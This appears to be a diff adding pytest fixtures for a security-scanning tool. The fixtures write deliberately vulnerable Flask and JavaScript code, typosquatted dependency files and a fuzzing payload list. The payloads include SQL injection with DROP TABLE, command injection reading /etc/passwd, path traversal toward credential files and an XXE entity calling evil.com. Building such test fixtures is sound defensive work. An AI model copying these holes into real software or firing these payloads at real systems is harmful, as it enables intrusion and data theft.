@@ -457,3 +457,515 @@ def temp_output_dir(tmp_path: Path) -> Generator[Path, None, None]:
     output_dir = tmp_path / ".agent-os"
     output_dir.mkdir()
     yield output_dir
+
+
+# ========== NEW E2E TEST FIXTURES ==========
+
+
+@pytest.fixture
+def sample_api_endpoints(tmp_path: Path) -> Generator[Path, None, None]:
+    """Create sample API endpoints with vulnerabilities"""
+    api_dir = tmp_path / "api"
+    api_dir.mkdir()
+
+    # Flask API with vulnerabilities
+    (api_dir / "flask_api.py").write_text(
+        '''
+"""Flask API with OWASP API Top 10 vulnerabilities"""
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+@app.route('/api/users/<user_id>')
+def get_user(user_id):
+    """BOLA vulnerability - no authorization check"""
+    query = f"SELECT * FROM users WHERE id = {user_id}"
+    return jsonify({"user": query})
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    """Broken authentication - weak password validation"""
+    username = request.json.get('username')
+    password = request.json.get('password')
+    if len(password) < 3:  # Weak validation
+        return jsonify({"token": "weak-token-123"})
+    return jsonify({"error": "Invalid"})
+
+@app.route('/api/fetch')
+def fetch_url():
+    """SSRF vulnerability"""
+    url = request.args.get('url')
+    import requests
+    response = requests.get(url)  # No validation
+    return response.text
+
+@app.route('/api/admin')
+def admin():
+    """Security misconfiguration - debug enabled"""
+    if app.debug:  # Debug should be disabled in production
+        return jsonify({"debug_info": "sensitive data"})
+'''
+    )
+
+    yield api_dir
+
+
+@pytest.fixture
+def sample_openapi_spec(tmp_path: Path) -> Generator[Path, None, None]:
+    """Create sample OpenAPI/Swagger specification"""
+    spec_file = tmp_path / "openapi.yaml"
+    spec_content = {
+        "openapi": "3.0.0",
+        "info": {"title": "Test API", "version": "1.0.0"},
+        "servers": [{"url": "http://api.example.com"}],
+        "paths": {
+            "/api/users/{id}": {
+                "get": {
+                    "summary": "Get user by ID",
+                    "parameters": [
+                        {
+                            "name": "id",
+                            "in": "path",
+                            "required": True,
+                            "schema": {"type": "integer"},
+                        }
+                    ],
+                    "responses": {"200": {"description": "Success"}},
+                }
+            },
+            "/api/login": {
+                "post": {
+                    "summary": "User login",
+                    "requestBody": {
+                        "content": {
+                            "application/json": {
+                                "schema": {
+                                    "type": "object",
+                                    "properties": {
+                                        "username": {"type": "string"},
+                                        "password": {"type": "string"},
+                                    },
+                                }
+                            }
+                        }
+                    },
+                    "responses": {"200": {"description": "Login successful"}},
+                }
+            },
+            "/api/search": {
+                "get": {
+                    "summary": "Search endpoint",
+                    "parameters": [
+                        {"name": "q", "in": "query", "schema": {"type": "string"}}
+                    ],
+                    "responses": {"200": {"description": "Search results"}},
+                }
+            },
+        },
+    }
+    spec_file.write_text(json.dumps(spec_content, indent=2))
+    yield spec_file
+
+
+@pytest.fixture
+def sample_supply_chain_packages(tmp_path: Path) -> Generator[Path, None, None]:
+    """Create sample dependency files with supply chain threats"""
+    repo_dir = tmp_path / "supply_chain_test"
+    repo_dir.mkdir()
+
+    # package.json with typosquatting
+    (repo_dir / "package.json").write_text(
+        json.dumps(
+            {
+                "name": "test-app",
+                "version": "1.0.0",
+                "dependencies": {
+                    "express": "^4.17.1",  # Legitimate
+                    "reakt": "^1.0.0",  # Typosquatting: react
+                    "lodahs": "^1.0.0",  # Typosquatting: lodash
+                    "axios": "^0.21.1",  # Legitimate
+                },
+            }
+        )
+    )
+
+    # requirements.txt with typosquatting
+    (repo_dir / "requirements.txt").write_text(
+        """django==3.2.0
+reqeusts==2.28.0
+numpy==1.21.0
+python-dateutil==2.8.2
+"""
+    )
+
+    # go.mod with suspicious package
+    (repo_dir / "go.mod").write_text(
+        """module example.com/app
+go 1.19
+require (
+    github.com/gin-gonic/gin v1.7.0
+    github.com/suspicious-package/malware v1.0.0
+)
+"""
+    )
+
+    yield repo_dir
+
+
+@pytest.fixture
+def sample_fuzzing_target(tmp_path: Path) -> Generator[Path, None, None]:
+    """Create sample fuzzing target with vulnerabilities"""
+    target_file = tmp_path / "fuzz_target.py"
+    target_file.write_text(
+        '''
+"""Fuzzing target with multiple vulnerabilities"""
+
+def parse_input(data: str) -> str:
+    """Parse user input with multiple vulnerabilities"""
+
+    # SQL Injection
+    if "'" in data and ("OR" in data or "UNION" in data):
+        raise ValueError("SQL injection detected")
+
+    # XSS
+    if "<script>" in data or "javascript:" in data:
+        raise ValueError("XSS detected")
+
+    # Command Injection
+    if ";" in data or "|" in data or "`" in data:
+        raise RuntimeError("Command injection detected")
+
+    # Buffer Overflow (simulated)
+    if len(data) > 1000:
+        raise MemoryError("Buffer overflow")
+
+    # Path Traversal
+    if "../" in data or "..\\" in data:
+        raise ValueError("Path traversal detected")
+
+    # XXE (simulated)
+    if "<!ENTITY" in data and "SYSTEM" in data:
+        raise ValueError("XXE detected")
+
+    return f"Processed: {data}"
+
+
+def parse_json_deeply(data: str, depth: int = 0):
+    """JSON parser with recursion vulnerability"""
+    import json
+    parsed = json.loads(data)
+
+    if depth > 50:
+        raise RecursionError("Maximum recursion depth exceeded")
+
+    if isinstance(parsed, dict):
+        for value in parsed.values():
+            if isinstance(value, dict):
+                parse_json_deeply(json.dumps(value), depth + 1)
+
+    return parsed
+'''
+    )
+    yield target_file
+
+
+@pytest.fixture
+def sample_dast_targets() -> list:
+    """Sample DAST targets for testing"""
+    return [
+        {
+            "url": "http://testapp.local/api/users/1",
+            "method": "GET",
+            "endpoint": "/api/users/{id}",
+            "vuln_type": "sql-injection",
+        },
+        {
+            "url": "http://testapp.local/api/search?q=test",
+            "method": "GET",
+            "endpoint": "/api/search",
+            "vuln_type": "xss",
+        },
+        {
+            "url": "http://testapp.local/api/fetch?url=http://internal",
+            "method": "GET",
+            "endpoint": "/api/fetch",
+            "vuln_type": "ssrf",
+        },
+        {
+            "url": "http://testapp.local/api/upload",
+            "method": "POST",
+            "endpoint": "/api/upload",
+            "vuln_type": "file-upload",
+        },
+    ]
+
+
+@pytest.fixture
+def mock_llm_response() -> dict:
+    """Mock LLM response for testing"""
+    return {
+        "analysis": "This finding appears to be a SQL injection vulnerability due to string concatenation in the query.",
+        "severity": "critical",
+        "confidence": 0.95,
+        "is_false_positive": False,
+        "recommendation": "Use parameterized queries to prevent SQL injection",
+        "fixed_code": 'query = "SELECT * FROM users WHERE id = ?"',
+        "test_cases": [
+            "' OR '1'='1",
+            "1; DROP TABLE users--",
+            "1' UNION SELECT NULL--",
+        ],
+    }
+
+
+@pytest.fixture
+def sample_correlation_data() -> dict:
+    """Sample SAST-DAST correlation data"""
+    return {
+        "sast_findings": [
+            {
+                "id": "sast-001",
+                "type": "sql-injection",
+                "severity": "high",
+                "file": "api/users.py",
+                "line": 42,
+                "endpoint": "/api/users/{id}",
+                "confidence": 0.7,
+            },
+            {
+                "id": "sast-002",
+                "type": "xss",
+                "severity": "medium",
+                "file": "api/search.py",
+                "line": 15,
+                "endpoint": "/api/search",
+                "confidence": 0.6,
+            },
+        ],
+        "dast_findings": [
+            {
+                "id": "dast-001",
+                "type": "sql-injection",
+                "severity": "critical",
+                "url": "http://api.example.com/api/users/1",
+                "matched_at": "/api/users/1",
+                "poc": "curl 'http://api.example.com/api/users/1%27'",
+            }
+        ],
+        "expected_correlations": [
+            {
+                "sast_id": "sast-001",
+                "dast_id": "dast-001",
+                "is_verified": True,
+                "confidence": 0.95,
+            }
+        ],
+    }
+
+
+@pytest.fixture
+def sample_test_generation_data() -> dict:
+    """Sample data for test generation"""
+    return {
+        "findings": [
+            {
+                "id": "test-gen-001",
+                "type": "sql-injection",
+                "severity": "critical",
+                "file": "app/db.py",
+                "line": 42,
+                "code": "query = f'SELECT * FROM users WHERE id = {user_id}'",
+                "language": "python",
+                "framework": "flask",
+            },
+            {
+                "id": "test-gen-002",
+                "type": "xss",
+                "severity": "high",
+                "file": "frontend/app.js",
+                "line": 15,
+                "code": "element.innerHTML = userInput;",
+                "language": "javascript",
+                "framework": "react",
+            },
+        ],
+        "expected_tests": {
+            "python": ["def test_sql_injection_", "assert", "pytest"],
+            "javascript": ["test(", "expect(", "it("],
+        },
+    }
+
+
+@pytest.fixture
+def sample_api_security_findings() -> list:
+    """Sample API security findings (OWASP API Top 10)"""
+    return [
+        {
+            "finding_id": "api-bola-001",
+            "owasp_category": "API1:2023",
+            "vulnerability_type": "BOLA",
+            "severity": "CRITICAL",
+            "title": "Broken Object Level Authorization",
+            "description": "Endpoint allows access to other users' data without authorization check",
+            "endpoint_path": "/api/users/{id}",
+            "http_method": "GET",
+            "file_path": "api/users.py",
+            "line_number": 25,
+        },
+        {
+            "finding_id": "api-auth-001",
+            "owasp_category": "API2:2023",
+            "vulnerability_type": "Broken Authentication",
+            "severity": "HIGH",
+            "title": "Weak Password Validation",
+            "description": "Password requirements are too weak (min 3 characters)",
+            "endpoint_path": "/api/login",
+            "http_method": "POST",
+            "file_path": "api/auth.py",
+            "line_number": 42,
+        },
+        {
+            "finding_id": "api-ssrf-001",
+            "owasp_category": "API7:2023",
+            "vulnerability_type": "SSRF",
+            "severity": "HIGH",
+            "title": "Server-Side Request Forgery",
+            "description": "Endpoint fetches user-provided URLs without validation",
+            "endpoint_path": "/api/fetch",
+            "http_method": "GET",
+            "file_path": "api/fetch.py",
+            "line_number": 15,
+        },
+    ]
+
+
+@pytest.fixture
+def sample_fuzzing_payloads() -> dict:
+    """Sample fuzzing payloads by vulnerability type"""
+    return {
+        "sql_injection": [
+            "' OR '1'='1",
+            "1; DROP TABLE users--",
+            "' UNION SELECT NULL--",
+            "admin'--",
+            "1' AND '1'='1",
+        ],
+        "xss": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+            "<svg onload=alert(1)>",
+            "'><script>alert(1)</script>",
+        ],
+        "command_injection": [
+            "; ls -la",
+            "| cat /etc/passwd",
+            "`whoami`",
+            "&& id",
+            "|| pwd",
+        ],
+        "path_traversal": [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        ],
+        "buffer_overflow": [
+            "A" * 1000,
+            "A" * 10000,
+            "A" * 100000,
+        ],
+        "xxe": [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
+        ],
+    }
+
+
+@pytest.fixture
+def complete_workflow_project(tmp_path: Path) -> Generator[Path, None, None]:
+    """
+    Create a complete project structure for end-to-end workflow testing
+    Includes API code, dependencies, and vulnerabilities across the stack
+    """
+    project_dir = tmp_path / "complete_project"
+    project_dir.mkdir()
+
+    # Backend API
+    api_dir = project_dir / "api"
+    api_dir.mkdir()
+    (api_dir / "users.py").write_text(
+        '''
+"""User API with vulnerabilities"""
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+@app.route('/api/users/<user_id>')
+def get_user(user_id):
+    # SQL Injection
+    query = f"SELECT * FROM users WHERE id = {user_id}"
+    return jsonify({"query": query})
+
+@app.route('/api/search')
+def search():
+    # XSS
+    term = request.args.get('q')
+    return f"<div>Results: {term}</div>"
+'''
+    )
+
+    # Frontend
+    frontend_dir = project_dir / "frontend"
+    frontend_dir.mkdir()
+    (frontend_dir / "app.js").write_text(
+        """
+function displayUser(data) {
+    // XSS vulnerability
+    document.getElementById('user').innerHTML = data.name;
+}
+
+function fetchUrl(url) {
+    // SSRF potential
+    fetch(url).then(r => r.text());
+}
+"""
+    )
+
+    # Dependencies
+    (project_dir / "package.json").write_text(
+        json.dumps(
+            {
+                "name": "complete-app",
+                "dependencies": {
+                    "express": "^4.17.1",
+                    "react": "^18.0.0",
+                    "axios": "^0.21.1",
+                },
+            }
+        )
+    )
+
+    (project_dir / "requirements.txt").write_text(
+        "flask==2.0.1\ndjango==3.2.0\nrequests==2.28.0\n"
+    )
+
+    # OpenAPI spec
+    (project_dir / "openapi.yaml").write_text(
+        json.dumps(
+            {
+                "openapi": "3.0.0",
+                "info": {"title": "Complete App API", "version": "1.0.0"},
+                "paths": {
+                    "/api/users/{id}": {
+                        "get": {
+                            "parameters": [{"name": "id", "in": "path"}],
+                            "responses": {"200": {"description": "OK"}},
+                        }
+                    }
+                },
+            }
+        )
+    )
+
+    yield project_dir
